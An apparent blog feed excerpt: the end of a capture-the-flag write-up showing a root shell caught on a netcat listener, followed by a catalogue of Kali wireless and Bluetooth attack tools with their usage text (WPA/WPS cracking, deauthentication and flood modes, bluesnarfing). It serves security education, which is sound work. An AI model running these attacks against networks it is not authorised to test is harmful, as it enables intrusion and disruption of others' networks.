<p><code>plain
[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
</code></p>

<p>And on my netcat side:</p>

<p><code>plain
sh-4.2# whoami
whoami
root
sh-4.2# cat /root/flag.txt
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
</code></p>

<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>

<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>

<p><img class="center" src="/images/pentest/relativity/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;fortune cowsay&rsquo;" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
    <link href="http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks/"/>
    <updated>2015-04-20T09:31:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/04/20/kali-tools-catalog-wireless-attacks</id>
    <content type="html"><![CDATA[<h3>802.11 Wireless Tools</h3>

<p><strong>aircrack-ng</strong></p>

<p>aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.
It can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the aircrack-ng  suite  determines
the  WEP key using two fundamental methods. The first method is via the
PTW approach (Pyshkin, Tews, Weinmann). The main advantage of  the  PTW
approach  is  that  very few data packets are required to crack the WEP
key. The second method is the FMS/KoreK method.  The  FMS/KoreK  method
incorporates  various  statistical  attacks to discover the WEP key and
uses these in combination with brute forcing.</p>

<!-- more -->


<p>Additionally, the program offers a dictionary  method  for  determining
the WEP key. For cracking WPA/WPA2 pre-shared keys, a wordlist (file or
stdin) or an airolib-ng has to be used.</p>

<p>``` plain
  Aircrack-ng 1.2 rc1 &ndash; &copy; 2006-2013 Thomas d'Otreppe
  <a href="http://www.aircrack-ng.org">http://www.aircrack-ng.org</a></p>

<p>  usage: aircrack-ng [options] &lt;.cap / .ivs file(s)></p>

<p>  Common options:</p>

<pre><code>  -a &lt;amode&gt; : force attack mode (1/WEP, 2/WPA-PSK)
  -e &lt;essid&gt; : target selection: network identifier
  -b &lt;bssid&gt; : target selection: access point's MAC
  -p &lt;nbcpu&gt; : # of CPU to use  (default: all CPUs)
  -q         : enable quiet mode (no status output)
  -C &lt;macs&gt;  : merge the given APs to a virtual one
  -l &lt;file&gt;  : write key to file
</code></pre>

<p>  Static WEP cracking options:</p>

<pre><code>  -c         : search alpha-numeric characters only
  -t         : search binary coded decimal chr only
  -h         : search the numeric key for Fritz!BOX
  -d &lt;mask&gt;  : use masking of the key (A1:XX:CF:YY)
  -m &lt;maddr&gt; : MAC address to filter usable packets
  -n &lt;nbits&gt; : WEP key length :  64/128/152/256/512
  -i &lt;index&gt; : WEP key index (1 to 4), default: any
  -f &lt;fudge&gt; : bruteforce fudge factor,  default: 2
  -k &lt;korek&gt; : disable one attack method  (1 to 17)
  -x or -x0  : disable bruteforce for last keybytes
  -x1        : last keybyte bruteforcing  (default)
  -x2        : enable last  2 keybytes bruteforcing
  -y         : experimental  single bruteforce mode
  -K         : use only old KoreK attacks (pre-PTW)
  -s         : show the key in ASCII while cracking
  -M &lt;num&gt;   : specify maximum number of IVs to use
  -D         : WEP decloak, skips broken keystreams
  -P &lt;num&gt;   : PTW debug:  1: disable Klein, 2: PTW
  -1         : run only 1 try to crack key with PTW
</code></pre>

<p>  WEP and WPA-PSK cracking options:</p>

<pre><code>  -w &lt;words&gt; : path to wordlist(s) filename(s)
</code></pre>

<p>  WPA-PSK options:</p>

<pre><code>  -E &lt;file&gt;  : create EWSA Project file v3
  -J &lt;file&gt;  : create Hashcat Capture file
  -S         : WPA cracking speed test
  -r &lt;DB&gt;    : path to airolib-ng database
               (Cannot be used with -w)
</code></pre>

<p>  Other options:</p>

<pre><code>  -u         : Displays # of CPUs &amp; MMX/SSE support
  --help     : Displays this usage screen
</code></pre>

<p>```</p>

<p><strong>asleap</strong></p>

<p>Actively recover LEAP/PPTP passwords</p>

<p><img class="center" src="/images/kali/wifi/asleap.png" title="&lsquo;asleap&rsquo; &lsquo;asleap&rsquo;" ></p>

<p><strong>bully</strong></p>

<p>Bully is a new implementation of the WPS brute force attack, written in C. It is conceptually identical to other programs, in that it exploits the (now well known) design flaw in the WPS specification. It has several advantages over the original reaver code. These include fewer dependencies, improved memory and cpu performance, correct handling of endianness, and a more robust set of options. It runs on Linux, and was specifically developed to run on embedded Linux systems (OpenWrt, etc) regardless of architecture.</p>

<p>Bully provides several improvements in the detection and handling of anomalous scenarios. It has been tested against access points from numerous vendors, and with differing configurations, with much success.</p>

<p>``` plain
  usage: bully <options> interface</p>

<p>  Required arguments:</p>

<pre><code>  interface      : Wireless interface in monitor mode (root required)

  -b, --bssid macaddr    : MAC address of the target access point
</code></pre>

<p>   Or</p>

<pre><code>  -e, --essid string     : Extended SSID for the access point
</code></pre>

<p>  Optional arguments:</p>

<pre><code>  -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
  -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
  -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
  -o, --outfile file     : Output file for messages          [stdout]
  -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
  -s, --source macaddr   : Source (hardware) MAC address      [Probe]
  -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]
  -w, --workdir path     : Location of pin/session files  [~/.bully/]
  -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
  -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
  -F, --force            : Force continue in spite of warnings   [No]
  -S, --sequential       : Sequential pins (do not randomize)    [No]
  -T, --test             : Test mode (do not inject any packets) [No]
</code></pre>

<p>  Advanced arguments:</p>

<pre><code>  -a, --acktime N        : Deprecated/ignored                  [Auto]
  -r, --retries N        : Resend packets N times when not acked  [2]
  -m, --m13time N        : Deprecated/ignored                  [Auto]
  -t, --timeout N        : Deprecated/ignored                  [Auto]
  -1, --pin1delay M,N    : Delay M seconds every Nth nack at M5 [0,1]
  -2, --pin2delay M,N    : Delay M seconds every Nth nack at M7 [5,1]
  -A, --noacks           : Disable ACK check for sent packets    [No]
  -C, --nocheck          : Skip CRC/FCS validation (performance) [No]
  -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]
  -E, --eapfail          : EAP Failure terminate every exchange  [No]
  -L, --lockignore       : Ignore WPS locks reported by the AP   [No]
  -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK's  [No]
  -N, --nofcs            : Packets don't contain the FCS field [Auto]
  -P, --probe            : Use probe request for nonbeaconing AP [No]
  -R, --radiotap         : Assume radiotap headers are present [Auto]
  -W, --windows7         : Masquerade as a Windows 7 registrar   [No]
  -Z, --suppress         : Suppress packet throttling algorithm  [No]
  -V, --version          : Print version info and exit
  -h, --help             : Display this help information
</code></pre>

<p>```</p>

<p><strong>cowpatty</strong></p>

<p>Implementation of an offline dictionary attack against WPA/WPA2 networks using PSK-based authentication (e.g. WPA-Personal). Many enterprise networks deploy PSK-based authentication mechanisms for WPA/WPA2 since it is much easier than establishing the necessary RADIUS, supplicant and certificate authority architecture needed for WPA-Enterprise authentication. Cowpatty can implement an accelerated attack if a precomputed PMK file is available for the SSID that is being assessed.</p>

<p><img class="center" src="/images/kali/wifi/cowpatty.png" title="&lsquo;cowpatty&rsquo; &lsquo;cowpatty&rsquo;" ></p>

<p><strong>eapmd5pass</strong></p>

<p>EAP-MD5 is a legacy authentication mechanism that does not provide sufficient protection for user authentication credentials. Users who authenticate using EAP-MD5 subject themselves to an offline dictionary attack vulnerability. This tool reads from a live network interface in monitor-mode, or from a stored libpcap capture file, and extracts the portions of the EAP-MD5 authentication exchange. Once the challenge and response portions have been collected from this exchange, eapmd5pass will mount an offline dictionary attack against the userâs password.</p>

<p><img class="center" src="/images/kali/wifi/eapmd5pass.png" title="&lsquo;eapmd5pass&rsquo; &lsquo;eapmd5pass&rsquo;" ></p>

<p><strong>fern-wifi-cracker</strong></p>

<p>Fern Wifi Cracker is a Wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks.</p>

<p>Fern Wifi Cracker currently supports the following features:</p>

<ul>
<li><p>WEP Cracking with Fragmentation,Chop-Chop, Caffe-Latte, Hirte, ARP Request Replay or WPS attack</p></li>
<li><p>WPA/WPA2 Cracking with Dictionary or WPS based attacks</p></li>
<li><p>Automatic saving of key in database on successful crack</p></li>
<li><p>Automatic Access Point Attack System</p></li>
<li><p>Session Hijacking (Passive and Ethernet Modes)</p></li>
<li><p>Access Point MAC Address Geo Location Tracking</p></li>
<li><p>Internal MITM Engine</p></li>
<li><p>Bruteforce Attacks (HTTP,HTTPS,TELNET,FTP)</p></li>
<li><p>Update Support</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/fern-wifi-cracker.png" title="&lsquo;fern-wifi-cracker&rsquo; &lsquo;fern-wifi-cracker&rsquo;" ></p>

<p><strong>genkeys</strong></p>

<p>Generates lookup file for asleap</p>

<p>``` plain
genkeys 2.2 &ndash; generates lookup file for asleap. <a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x6a;&#119;&#114;&#105;&#103;&#x68;&#x74;&#x40;&#104;&#x61;&#115;&#98;&#x6f;&#x72;&#x67;&#46;&#99;&#111;&#109;">&#106;&#x77;&#x72;&#105;&#x67;&#x68;&#x74;&#64;&#x68;&#x61;&#x73;&#x62;&#111;&#114;&#103;&#x2e;&#99;&#x6f;&#109;</a>
genkeys: Must supply -r -f and -n
Usage: genkeys [options]</p>

<pre><code>-r  Input dictionary file, one word per line
-f  Output pass+hash filename
-n  Output index filename
-h  Last 2 hash bytes to filter with (optional)
</code></pre>

<p>```</p>

<p><strong>genpmk</strong></p>

<p>WPA-PSK precomputation attack</p>

<p><img class="center" src="/images/kali/wifi/genpmk.png" title="&lsquo;genpmk&rsquo; &lsquo;genpmk&rsquo;" ></p>

<p><strong>giskismet</strong></p>

<p>GISKismet is a wireless recon visualization tool to represent data gathered using Kismet in a flexible manner. GISKismet stores the information in a database so that the user can generate graphs using SQL. GISKismet currently uses SQLite for the database and GoogleEarth / KML files for graphing.</p>

<p>``` plain
Usage: giskismet [Options]</p>

<p>Input File:</p>

<pre><code>   --csv &lt;csv-file&gt;             Parse the input from Kismet-devel CSV
</code></pre>

<p>   -x  &mdash;xml &lt;xml-file>             Parse the input from Kismet-newcore NETXML</p>

<p>Input Filters:</p>

<pre><code>   --bssid file | list          Filter based on BSSID     
   --essid file | list          Filter based on ESSID 
   --encryption file | list     Filter based on Encryption 
   --channel file | list        Filter based on Channel
</code></pre>

<p>file | list (list = comma separated lists(needs quotes)</p>

<p>Kismet-newcore Options:
   -a  &mdash;ap                         Insert only the APs</p>

<p>Query
   -q  &mdash;query [sql]                SQL query
   -m  &mdash;manual [csv]               CSV output of manual SQL query</p>

<p>   -o  &mdash;output [file]              Output filename
   -n  &mdash;name [str]                 Name of the KML layer</p>

<pre><code>   --desc [str]                 Description of the KML layer
</code></pre>

<p>General Options:</p>

<pre><code>   --ignore-gps                 Import data even when GPS fields are missing
   --database [file]            SQLite3 database name [default: wireless.dbl]
</code></pre>

<p>   -d  &mdash;debug [num]                Display debug information
   -s  &mdash;silent                     No output when adding APs
   -v  &mdash;version                    Display version
   -h  &mdash;help                       Display this information</p>

<p>Send Comments to Joshua &ldquo;Jabra&rdquo; Abraham ( <a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x6a;&#x61;&#x62;&#114;&#97;&#64;&#x73;&#x70;&#108;&#48;&#105;&#x74;&#46;&#111;&#114;&#103;">&#x6a;&#x61;&#98;&#x72;&#97;&#64;&#x73;&#112;&#108;&#x30;&#105;&#116;&#x2e;&#x6f;&#x72;&#x67;</a> )
```</p>

<p><strong>kismet</strong></p>

<p>Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet will work with any wireless card which supports raw monitoring (rfmon) mode, and (with appropriate hardware) can sniff 802.11b, 802.11a, 802.11g, and 802.11n traffic. Kismet also supports plugins which allow sniffing other media such as DECT.</p>

<p>Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and infering the presence of nonbeaconing networks via data traffic.</p>

<p>Kismet supports logging to the wtapfile packet format (readable by tcpdump and ethereal) and saves detected network information as plaintext,
CSV, and XML.  kismet is capable of using any GPS supported by gpsd and
logs and plots network data.</p>

<p><img class="center" src="/images/kali/wifi/kismet.png" title="&lsquo;kismet&rsquo; &lsquo;kismet&rsquo;" ></p>

<p><strong>mdk3</strong></p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>

<p>``` plain
MDK 3.0 v6 &ndash; &ldquo;Yeah, well, whatever&rdquo;
by ASPj of k2wrlz, using the osdep library from aircrack-ng
And with lots of help from the great aircrack-ng community:
Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
THANK YOU!</p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
IMPORTANT: It is your responsibility to make sure you have permission from the
network owner before running MDK against it.</p>

<p>This code is licenced under the GPLv2</p>

<p>MDK USAGE:
mdk3 <interface> &lt;test_mode> [test_options]</p>

<p>Try mdk3 &mdash;fullhelp for all test options
Try mdk3 &mdash;help &lt;test_mode> for info about one test only</p>

<p>TEST MODES:
b   &ndash; Beacon Flood Mode</p>

<pre><code>  Sends beacon frames to show fake APs at clients.
  This can sometimes crash network scanners and even drivers!
</code></pre>

<p>a   &ndash; Authentication DoS mode</p>

<pre><code>  Sends authentication frames to all APs found in range.
  Too much clients freeze or reset some APs.
</code></pre>

<p>p   &ndash; Basic probing and ESSID Bruteforce mode</p>

<pre><code>  Probes AP and check for answer, useful for checking if SSID has
  been correctly decloaked or if AP is in your adaptors sending range
  SSID Bruteforcing is also possible with this test mode.
</code></pre>

<p>d   &ndash; Deauthentication / Disassociation Amok Mode</p>

<pre><code>  Kicks everybody found from AP
</code></pre>

<p>m   &ndash; Michael shutdown exploitation (TKIP)</p>

<pre><code>  Cancels all traffic continuously
</code></pre>

<p>x   &ndash; 802.1X tests
w   &ndash; WIDS/WIPS Confusion</p>

<pre><code>  Confuse/Abuse Intrusion Detection and Prevention Systems
</code></pre>

<p>f   &ndash; MAC filter bruteforce mode</p>

<pre><code>  This test uses a list of known client MAC Adresses and tries to
  authenticate them to the given AP while dynamically changing
  its response timeout for best performance. It currently works only
  on APs who deny an open authentication request properly
</code></pre>

<p>g   &ndash; WPA Downgrade test</p>

<pre><code>  deauthenticates Stations and APs sending WPA encrypted packets.
  With this test you can check if the sysadmin will try setting his
  network to WEP or disable encryption.
</code></pre>

<p>```</p>

<p><strong>wifiarp</strong></p>

<p>Wifi injection ARP answering tool based on Wifitap</p>

<p><strong>wifidns</strong></p>

<p>Wifi injection DNS answering tool based on Wifitap</p>

<p>``` plain
root@kali:~# wifidns -h
Psyco optimizer not installed, running anyway&hellip;
INFO: did not find python gnuplot wrapper . Won&rsquo;t be able to plot
INFO: Can&rsquo;t open /etc/ethertypes file
Usage: wifidns -b <BSSID> -a <IP> [-o <iface>] [-i <iface>]</p>

<pre><code>                      [-s &lt;SMAC&gt;] [-t &lt;TTL&gt;] [-w &lt;WEP key&gt;]
                      [-k &lt;key id&gt;]] [-d [-v]] [-h]
 -b &lt;BSSID&gt;    specify BSSID for injection
 -a &lt;IP&gt;       specify IP address for DNS answers
 -t &lt;TTL&gt;      Set TTL (default: 64)
 -o &lt;iface&gt;    specify interface for injection (default: ath0)
 -i &lt;iface&gt;    specify interface for listening (default: ath0)
 -s &lt;SMAC&gt;     specify source MAC address for injected frames
 -w &lt;key&gt;      WEP mode and key
 -k &lt;key id&gt;   WEP key id (default: 0)
 -d            activate debug
 -v            verbose debugging
 -h            this so helpful output
</code></pre>

<p>```</p>

<p><strong>wifi-honey</strong></p>

<p>This script creates five monitor mode interfaces, four are used as APs and the fifth is used for airodump-ng. To make things easier, rather than having five windows all this is done in a screen session which allows you to switch between screens to see what is going on. All sessions are labelled so you know which is which.</p>

<p>``` plain
Usage: /usr/bin/wifi-honey <essid> <channel> <interface></p>

<p>Default channel is 1
Default interface is wlan0</p>

<p>Robin Wood <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x72;&#x6f;&#98;&#x69;&#x6e;&#64;&#x64;&#x69;&#x67;&#105;&#x6e;&#x69;&#110;&#106;&#97;&#x2e;&#111;&#x72;&#x67;">&#114;&#111;&#98;&#x69;&#x6e;&#64;&#100;&#105;&#x67;&#x69;&#x6e;&#105;&#x6e;&#106;&#97;&#46;&#x6f;&#114;&#x67;</a>
See Security Tube Wifi Mega Primer episode 26 for more information
```</p>

<p><strong>wifiping</strong></p>

<p>Wifi injection based answering tool based on Wifitap</p>

<p><strong>wifitap</strong></p>

<p>Wifitap is a proof of concept for communication over WiFi networks using traffic injection.</p>

<p>Wifitap allows any application do send and receive IP packets using 802.11 traffic capture and injection over a WiFi network simply configuring wj0, which means :</p>

<ul>
<li><p>setting an IP address consistent with target network address range</p></li>
<li><p>routing desired traffic through it</p></li>
</ul>


<p>In particular, itâs a cheap method for arbitrary packets injection in 802.11 frames without specific library.</p>

<p>In addition, it will allow one to get rid of any limitation set at access point level, such as bypassing inter-client communications prevention systems (e.g. Cisco PSPF) or reaching multiple SSID handled by the same access point.</p>

<p><img class="center" src="/images/kali/wifi/wifitap.png" title="&lsquo;wifitap&rsquo; &lsquo;wifitap&rsquo;" ></p>

<p><strong>wifite</strong></p>

<p>An automated wireless attack tool. To attack multiple WEP, WPA, and WPS encrypted networks in a row. This tool is customizable to be automated with only a few arguments. Wifite aims to be the &ldquo;set it and forget it&rdquo; wireless auditing tool.</p>

<p>Features</p>

<ul>
<li><p>sorts targets by signal strength (in dB); cracks closest access points first</p></li>
<li><p>automatically de-authenticates clients of hidden networks to reveal SSIDs</p></li>
<li><p>numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)</p></li>
<li><p>customizable settings (timeouts, packets/sec, etc)</p></li>
<li><p>&ldquo;anonymous&rdquo; feature; changes MAC to a random address before attacking, then changes back when attacks are complete</p></li>
<li><p>all captured WPA handshakes are backed up to wifite.py&rsquo;s current directory</p></li>
<li><p>smart WPA de-authentication; cycles between all clients and broadcast deauths</p></li>
<li><p>stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit</p></li>
<li><p>displays session summary at exit; shows any cracked keys</p></li>
<li><p>all passwords saved to cracked.txt</p></li>
<li><p>built-in updater: ./wifite.py -upgrade</p></li>
</ul>


<p><code>`` plain
 .;'                    </code>;,  <br/>
 .;&lsquo;  ,;&rsquo;             <code>;, </code>;,   WiFite v2 (r85)
.;&lsquo;  ,;&rsquo;  ,;&lsquo;     <code>;, </code>;,  `;,<br/>
::   ::   :   ( )   :   ::   ::  automated wireless auditor
&rsquo;:.  &lsquo;:.  &rsquo;:. /<em>\ ,:&lsquo;  ,:&rsquo;  ,:&lsquo;<br/>
 &rsquo;:.  &lsquo;:.    /</em><strong>\    ,:&rsquo;  ,:&lsquo;   designed for Linux
  &rsquo;:.       /</strong>___\      ,:'</p>

<pre><code>       /       \             
</code></pre>

<p>   COMMANDS</p>

<pre><code>-check &lt;file&gt;   check capfile &lt;file&gt; for handshakes.
-cracked        display previously-cracked access points
</code></pre>

<p>   GLOBAL</p>

<pre><code>-all            attack all targets.              [off]
-i &lt;iface&gt;      wireless interface for capturing [auto]
-mac            anonymize mac address            [off]
-c &lt;channel&gt;    channel to scan for targets      [auto]
-e &lt;essid&gt;      target a specific access point by ssid (name)  [ask]
-b &lt;bssid&gt;      target a specific access point by bssid (mac)  [auto]
-showb          display target BSSIDs after scan               [off]
-pow &lt;db&gt;       attacks any targets with signal strenghth &gt; db [0]
-quiet          do not print list of APs during scan           [off]
</code></pre>

<p>   WPA</p>

<pre><code>-wpa            only target WPA networks (works with -wps -wep)   [off]
-wpat &lt;sec&gt;     time to wait for WPA attack to complete (seconds) [500]
-wpadt &lt;sec&gt;    time to wait between sending deauth packets (sec) [10]
-strip          strip handshake using tshark or pyrit             [off]
-crack &lt;dic&gt;    crack WPA handshakes using &lt;dic&gt; wordlist file    [off]
-dict &lt;file&gt;    specify dictionary to use when cracking WPA [phpbb.txt]
-aircrack       verify handshake using aircrack [on]
-pyrit          verify handshake using pyrit    [off]
-tshark         verify handshake using tshark   [on]
-cowpatty       verify handshake using cowpatty [off]
</code></pre>

<p>   WEP</p>

<pre><code>-wep            only target WEP networks [off]
-pps &lt;num&gt;      set the number of packets per second to inject [600]
-wept &lt;sec&gt;     sec to wait for each attack, 0 implies endless [600]
-chopchop       use chopchop attack      [on]
-arpreplay      use arpreplay attack     [on]
-fragment       use fragmentation attack [on]
-caffelatte     use caffe-latte attack   [on]
-p0841          use -p0841 attack        [on]
-hirte          use hirte (cfrag) attack [on]
-nofakeauth     stop attack if fake authentication fails    [off]
-wepca &lt;n&gt;      start cracking when number of ivs surpass n [10000]
-wepsave        save a copy of .cap files to this directory [off]
</code></pre>

<p>   WPS</p>

<pre><code>-wps        only target WPS networks         [off]
-wpst &lt;sec&gt;     max wait for new retry before giving up (0: never)  [660]
-wpsratio &lt;per&gt; min ratio of successful PIN attempts/total tries    [0]
-wpsretry &lt;num&gt; max number of retries for same PIN before giving up [0]
</code></pre>

<p>   EXAMPLE</p>

<pre><code>./wifite.py -wps -wep -c 6 -pps 600
</code></pre>

<p> [+] quitting
```</p>

<h3>Bluetooth Tools</h3>

<p><strong>bluelog</strong></p>

<p>Bluelog  is  a simple Bluetooth scanner that is designed to essentially
do just one thing, log all the discoverable devices in the area. It  is
intended  to  be  used as a site survey tool, identifying the number of
possible Bluetooth targets there are in the surrounding environment.</p>

<p>``` plain</p>

<h2>Bluelog (v1.1.2) by Tom Nardi &ldquo;MS3FGX&rdquo; (<a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#x4d;&#x53;&#51;&#70;&#71;&#88;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#99;&#111;&#x6d;">&#77;&#x53;&#x33;&#x46;&#x47;&#x58;&#x40;&#103;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;</a>)</h2>

<p>Bluelog is a Bluetooth site survey tool, designed to tell you how
many discoverable devices there are in an area as quickly as possible.
As the name implies, its primary function is to log discovered devices
to file rather than to be used interactively. Bluelog could run on a
system unattended for long periods of time to collect data.</p>

<p>Bluelog also includes a mode called &ldquo;Bluelog Live&rdquo; which creates a
webpage of the results that you can serve up with your HTTP daemon of
choice. See the &ldquo;README.LIVE&rdquo; file for details.</p>

<p>For more information, see: www.digifail.com</p>

<p>Basic Options:</p>

<pre><code>-i &lt;interface&gt;     Sets scanning device, default is "hci0"
-o &lt;filename&gt;      Sets output filename, default is "devices.log"
-v                 Verbose, prints discovered devices to the terminal
-q                 Quiet, turns off nonessential terminal outout
-d                 Enables daemon mode, Bluelog will run in background
-k                 Kill an already running Bluelog process
-l                 Start "Bluelog Live", default is disabled
</code></pre>

<p>Logging Options:</p>

<pre><code>-n                 Write device names to log, default is disabled
-m                 Write device manufacturer to log, default is disabled
-c                 Write device class to log, default is disabled
-f                 Use "friendly" device class, default is disabled
-t                 Write timestamps to log, default is disabled
-x                 Obfuscate discovered MACs, default is disabled
-e                 Encode discovered MACs with CRC32, default disabled
-b                 Enable BlueProPro log format, see README
</code></pre>

<p>Advanced Options:</p>

<pre><code>-r &lt;retries&gt;       Name resolution retries, default is 3
-a &lt;minutes&gt;       Amnesia, Bluelog will forget device after given time
-w &lt;seconds&gt;       Scanning window in seconds, see README
-s                 Syslog only mode, no log file. Default is disabled
</code></pre>

<p>```</p>

<p><strong>bluemaho</strong></p>

<p>BlueMaho is GUI-shell (interface) for suite of tools for testing security of bluetooth devices. It is freeware, opensource, written on python, uses wxPyhon. It can be used for testing BT-devices for known vulnerabilities and major thing to do â testing to find unknown vulns. Also it can form nice statistics.</p>

<p>Features:</p>

<ul>
<li><p>scan for devices, show advanced info, SDP records, vendor etc</p></li>
<li><p>track devices â show where and how much times device was seen, its name changes</p></li>
<li><p>loop scan â it can scan all time, showing you online devices</p></li>
<li><p>alerts with sound if new device found</p></li>
<li><p>on_new_device â you can specify what command should it run when it founds new device</p></li>
<li><p>it can use separate dongles â one for scaning (loop scan) and one for running tools or exploits</p></li>
<li><p>send files</p></li>
<li><p>change name, class, mode, BD_ADDR of local HCI devices</p></li>
<li><p>save results in database</p></li>
<li><p>form nice statistics (uniq devices by day/hour, vendors, services etc)</p></li>
<li><p>test remote device for known vulnerabilities (see exploits for more details)</p></li>
<li><p>test remote device for unknown vulnerabilities (see tools for more details)</p></li>
<li><p>themes! you can customize it</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/bluemaho.png" title="&lsquo;bluemaho&rsquo; &lsquo;bluemaho&rsquo;" ></p>

<p><strong>blueranger</strong></p>

<p>BlueRanger is a simple Bash script which uses Link Quality to locate Bluetooth device radios. It sends l2cap (Bluetooth) pings to create a connection between Bluetooth interfaces, since most devices allow pings without any authentication or authorization. The higher the link quality, the closer the device (in theory).</p>

<p>Use a Bluetooth Class 1 adapter for long range location detection. Switch to a Class 3 adapter for more precise short range locating. The recision and accuracy depend on the build quality of the Bluetooth adapter, interference, and response from the remote device. Fluctuations may occur even when neither device is in motion.</p>

<p>``` plain
BlueRanger 1.0 by JP Dunning (.ronin)
&lt;www.hackfromacave.com>
&copy; 2009-2012 Shadow Cave LLC.</p>

<p>NAME</p>

<pre><code>blueranger
</code></pre>

<p>SYNOPSIS</p>

<pre><code>    blueranger.sh &lt;hciX&gt; &lt;bdaddr&gt;
</code></pre>

<p>DESCRIPTION</p>

<pre><code>&lt;hciX&gt;         Local interface
&lt;bdaddr&gt;       Remote Device Address
</code></pre>

<p>```</p>

<p><strong>bluesnarfer</strong></p>

<p>A Bluetooth bluesnarfing Utility.</p>

<p><img class="center" src="/images/kali/wifi/bluesnarfer.png" title="&lsquo;bluesnarfer&rsquo; &lsquo;bluesnarfer&rsquo;" ></p>

<p><strong>btscanner</strong></p>

<p>btscanner is a tool designed specifically to extract as  much  information  as  possible  from  a Bluetooth device without the requirement to
pair. A detailed information screen extracts HCI and  SDP  information,
and  maintains an open connection to monitor the RSSI and link quality.
btscanner is based on the BlueZ Bluetooth stack, which is included with
recent  Linux kernels, and the BlueZ toolset. btscanner also contains a
complete listing of the IEEE OUI numbers and class lookup tables. Using
the information gathered from these sources it is possible to make educated guesses as to the host device type.</p>

<p>``` plain
Usage: btscanner [options]
options</p>

<pre><code>--help  Display help
--cfg=&lt;file&gt;    Use &lt;file&gt; as the config file
--no-reset  Do not reset the Bluetooth adapter before scanning
</code></pre>

<p>```</p>

<p><strong>redfang</strong></p>

<p>RedFang is a small proof-of-concept application to find non discoverable Bluetooth devices. This is done by brute forcing the last six (6) bytes of the Bluetooth address of the device and doing a read_remote_name().</p>

<p><img class="center" src="/images/kali/wifi/redfang.png" title="&lsquo;redfang&rsquo; &lsquo;redfang&rsquo;" ></p>

<p><strong>spooftooph</strong></p>

<p>Spooftooph is designed to automate spoofing or cloning Bluetooth device information. Make a Bluetooth device hide in plain site.</p>

<p>Features:</p>

<ul>
<li><p>Clone and log Bluetooth device information</p></li>
<li><p>Generate a random new Bluetooth profile</p></li>
<li><p>Change Bluetooth profile every X seconds</p></li>
<li><p>Specify device information for Bluetooth interface</p></li>
<li><p>Select device to clone from scan log</p></li>
</ul>


<p><img class="center" src="/images/kali/wifi/spooftooph.png" title="&lsquo;spooftooph&rsquo; &lsquo;spooftooph&rsquo;" ></p>

<h3>Other Wireless Tools</h3>

<p><strong>zbassocflood</strong></p>

<p>Transmit a flood of associate requests to a target network.</p>

<p>``` plain
zbassocflood: Transmit a flood of associate requests to a target network.
<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#106;&#119;&#114;&#105;&#103;&#104;&#116;&#64;&#x77;&#x69;&#x6c;&#108;&#104;&#97;&#x63;&#x6b;&#102;&#x6f;&#x72;&#x73;&#x75;&#115;&#104;&#x69;&#x2e;&#x63;&#111;&#109;">&#x6a;&#119;&#x72;&#x69;&#103;&#104;&#116;&#x40;&#119;&#105;&#x6c;&#x6c;&#104;&#97;&#x63;&#107;&#x66;&#x6f;&#x72;&#x73;&#117;&#x73;&#104;&#x69;&#x2e;&#99;&#111;&#109;</a></p>

<p>Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]</p>

<pre><code>                    [-s per-packet delay/float]
</code></pre>

<p>e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1
```</p>

<p><strong>zbdsniff</strong></p>

<p>Decode plaintext key ZigBee delivery from a capture file.  Will
process libpcap or Daintree SNA capture files.</p>

<p>``` plain
zbdsniff: Decode plaintext key ZigBee delivery from a capture file.  Will
